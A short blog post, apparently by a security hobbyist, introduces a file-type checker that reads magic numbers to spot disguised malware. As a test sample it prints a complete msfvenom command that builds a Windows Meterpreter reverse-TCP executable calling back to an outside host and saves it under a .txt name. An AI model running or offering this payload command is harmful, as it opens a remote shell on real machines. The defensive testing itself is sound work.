New Tool I made, File Type Checker

I made a quick tool today and wanted to go over what blue team projects are like this. It’s a basic file-type checker that uses magic numbers. And I liked the results of what I made:

So I made a basic bash script first, then made a quick msfvenom:

 msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -f exe -o shell.txt

I just needed to make a quick file type for testing, and it worked like a charm! I ended up renaming the repo here:

GitHub - HackingHusky/File-type-checker: Uses magic numbers and reports back for malware/rce from…
Uses magic numbers and reports back for malware/rce from the directory and file type, and gives scan report …github.com

You will need the library mentioned on the list, but it's only one install

git clone https://github.com/yourusername/file-malware-scanner.git
cd file-malware-scanner
pip install rarfile py7zr

Or in kali:

pipx install py7zr

You’ll need to make sure you move the file type to the same location as the script, and it will show if someone has placed malware or a reverse shell on that machine.
